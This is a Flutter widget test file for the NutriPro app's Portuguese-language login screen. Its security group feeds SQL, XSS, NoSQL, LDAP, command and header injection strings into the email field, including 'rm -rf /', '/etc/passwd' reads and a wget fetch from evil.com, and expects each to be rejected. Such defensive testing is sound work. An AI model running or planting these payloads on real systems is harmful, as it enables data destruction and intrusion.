import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:nutripro_flutter/presentation/screens/login_screen.dart';
import 'package:nutripro_flutter/core/services/mock_authentication_service.dart';
import 'package:nutripro_flutter/presentation/widgets/loading_button.dart';

void main() {
  group('LoginScreen Widget Tests', () {
    late MockAuthenticationService mockAuthService;

    setUp(() {
      mockAuthService = MockAuthenticationService();
    });

    Widget createLoginScreen() {
      return MaterialApp(home: LoginScreen(authService: mockAuthService));
    }

    testWidgets('deve exibir todos os elementos da tela de login', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Verifica se os elementos principais estão presentes
      expect(find.text('Bem-vindo'), findsOneWidget);
      expect(find.text('Faça login para continuar'), findsOneWidget);
      expect(find.text('E-mail'), findsOneWidget);
      expect(find.text('Senha'), findsOneWidget);
      expect(find.text('Entrar'), findsOneWidget);
      expect(find.text('Esqueceu a senha?'), findsOneWidget);
      expect(find.text('Não tem uma conta?'), findsOneWidget);
      expect(find.text('Registrar-se'), findsOneWidget);
    });

    testWidgets('deve ter campos de entrada para email e senha', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Verifica se os campos de entrada estão presentes
      expect(find.byType(TextFormField), findsNWidgets(2));
      expect(find.text('Insira seu e-mail'), findsOneWidget);
      expect(find.text('Insira sua senha'), findsOneWidget);
    });

    testWidgets('deve mostrar erro para email inválido', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Digita email inválido
      await tester.enterText(find.byType(TextFormField).first, 'emailinvalido');
      await tester.enterText(find.byType(TextFormField).last, 'senha123');

      // Tenta submeter o formulário
      await tester.tap(find.text('Entrar'));
      await tester.pump();

      // Verifica se a mensagem de erro aparece
      expect(find.text('Por favor, insira um e-mail válido'), findsOneWidget);
    });

    testWidgets('deve mostrar erro para senha muito curta', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Digita email válido e senha curta
      await tester.enterText(
        find.byType(TextFormField).first,
        'teste@email.com',
      );
      await tester.enterText(find.byType(TextFormField).last, '123');

      // Tenta submeter o formulário
      await tester.tap(find.text('Entrar'));
      await tester.pump();

      // Verifica se a mensagem de erro aparece
      expect(
        find.text('A senha deve ter pelo menos 6 caracteres'),
        findsOneWidget,
      );
    });

    testWidgets('deve mostrar erro para campos vazios', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Tenta submeter o formulário sem preencher nada
      await tester.tap(find.text('Entrar'));
      await tester.pump();

      // Verifica se as mensagens de erro aparecem
      expect(find.text('Por favor, insira seu e-mail'), findsOneWidget);
      expect(find.text('Por favor, insira sua senha'), findsOneWidget);
    });

    testWidgets('deve alternar visibilidade da senha', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Verifica se a senha está oculta inicialmente
      expect(find.byIcon(Icons.visibility_outlined), findsOneWidget);

      // Clica no ícone de visibilidade
      await tester.tap(find.byIcon(Icons.visibility_outlined));
      await tester.pump();

      // Verifica se o ícone mudou
      expect(find.byIcon(Icons.visibility_off_outlined), findsOneWidget);

      // Clica novamente
      await tester.tap(find.byIcon(Icons.visibility_off_outlined));
      await tester.pump();

      // Verifica se voltou ao estado inicial
      expect(find.byIcon(Icons.visibility_outlined), findsOneWidget);
    });

    testWidgets('deve mostrar erro de login com credenciais inválidas', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Digita credenciais inválidas
      await tester.enterText(
        find.byType(TextFormField).first,
        'teste@email.com',
      );
      await tester.enterText(find.byType(TextFormField).last, 'senhaerrada');

      // Submete o formulário
      await tester.tap(find.text('Entrar'));
      await tester.pump();

      // Aguarda a resposta assíncrona
      await tester.pump(const Duration(seconds: 2));

      // Verifica se a mensagem de erro aparece
      expect(find.text('E-mail ou senha inválidos.'), findsOneWidget);
    });

    testWidgets('deve navegar para tela de registro', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Clica no link de registro
      await tester.tap(find.text('Registrar-se'));
      await tester.pumpAndSettle();

      // Verifica se navegou para a tela de registro
      expect(find.text('Criar Conta'), findsOneWidget);
    });

    testWidgets('deve navegar para tela de recuperação de senha', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Clica no link de esqueceu a senha
      await tester.tap(find.text('Esqueceu a senha?'));
      await tester.pumpAndSettle();

      // Verifica se navegou para a tela de recuperação
      expect(find.text('Recuperar Senha'), findsOneWidget);
    });

    testWidgets('deve desabilitar botões durante carregamento', (
      WidgetTester tester,
    ) async {
      await tester.pumpWidget(createLoginScreen());

      // Digita credenciais válidas, mas senha errada para simular loading sem navegação
      await tester.enterText(
        find.byType(TextFormField).first,
        'teste@email.com',
      );
      await tester.enterText(find.byType(TextFormField).last, 'senhaerrada');

      // Submete o formulário
      await tester.tap(find.text('Entrar'));
      await tester.pump();

      // O botão deve estar em loading
      final loadingButton = tester.widget<LoadingButton>(
        find.byType(LoadingButton),
      );
      expect(loadingButton.isLoading, isTrue);

      // Aguarda o término da operação assíncrona
      await tester.pump(const Duration(seconds: 2));

      // Após o loading, o botão deve voltar ao normal
      final loadingButtonAfter = tester.widget<LoadingButton>(
        find.byType(LoadingButton),
      );
      expect(loadingButtonAfter.isLoading, isFalse);
    });

    group('Testes de Segurança', () {
      testWidgets('deve rejeitar tentativas de SQL injection no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de SQL injection
        final sqlInjectionPatterns = [
          "' OR '1'='1",
          "'; DROP TABLE users; --",
          "' UNION SELECT * FROM users --",
          "admin'--",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ];

        for (final pattern in sqlInjectionPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não aceitar o SQL injection
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de XSS no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de XSS
        final xssPatterns = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '<img src="x" onerror="alert(\'xss\')">',
          '"><script>alert("xss")</script>',
          '&#60;script&#62;alert("xss")&#60;/script&#62;',
        ];

        for (final pattern in xssPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não executar o XSS
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de NoSQL injection no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de NoSQL injection
        final nosqlInjectionPatterns = [
          '{"\$ne": null}',
          '{"\$gt": ""}',
          '{"\$where": "1==1"}',
          'admin@test.com" || "1"=="1',
          '{"\$regex": ".*"}',
        ];

        for (final pattern in nosqlInjectionPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não aceitar a NoSQL injection
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de command injection no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de command injection
        final commandInjectionPatterns = [
          'test@test.com; rm -rf /',
          'test@test.com && cat /etc/passwd',
          'test@test.com | ls -la',
          'test@test.com; echo "malicious" > /tmp/hack',
          'test@test.com && wget http://evil.com/malware',
        ];

        for (final pattern in commandInjectionPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não executar comandos
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de LDAP injection no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de LDAP injection
        final ldapInjectionPatterns = [
          'test@test.com)(uid=*))(|(uid=*',
          'test@test.com*)(uid=*))(|(uid=*',
          'test@test.com)(|(password=*))',
          'test@test.com*)(|(objectclass=*))',
          'test@test.com)(cn=*))(|(cn=*',
        ];

        for (final pattern in ldapInjectionPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não aceitar a LDAP injection
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de path traversal no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de path traversal
        final pathTraversalPatterns = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '..%252f..%252f..%252fetc%252fpasswd',
        ];

        for (final pattern in pathTraversalPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern + '@test.com',
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não permitir path traversal
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de log injection no campo email', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de log injection
        final logInjectionPatterns = [
          'test@test.com\n[ERROR] Fake error message',
          'test@test.com\r\n[WARN] Fake warning',
          'test@test.com\n[INFO] Fake info message',
          'test@test.com\r[DEBUG] Fake debug message',
          'test@test.com\n[CRITICAL] Fake critical error',
        ];

        for (final pattern in logInjectionPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não permitir log injection
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });

      testWidgets('deve rejeitar tentativas de email header injection', (
        WidgetTester tester,
      ) async {
        await tester.pumpWidget(createLoginScreen());

        // Testa diferentes padrões de email header injection
        final headerInjectionPatterns = [
          'test@test.com\nTo: evil@hacker.com',
          'test@test.com\r\nSubject: Hacked',
          'test@test.com\nCC: victim@company.com',
          'test@test.com\r\nBCC: admin@company.com',
          'test@test.com\nFrom: fake@company.com',
        ];

        for (final pattern in headerInjectionPatterns) {
          await tester.enterText(
            find.byType(TextFormField).first,
            pattern,
          );
          await tester.enterText(
            find.byType(TextFormField).last,
            'senha123',
          );

          await tester.tap(find.text('Entrar'));
          await tester.pump();

          // Deve mostrar erro de email inválido, não permitir header injection
          expect(
            find.text('Por favor, insira um e-mail válido'),
            findsOneWidget,
          );

          // Limpa os campos para o próximo teste
          await tester.enterText(find.byType(TextFormField).first, '');
          await tester.enterText(find.byType(TextFormField).last, '');
        }
      });
    });
  });
}
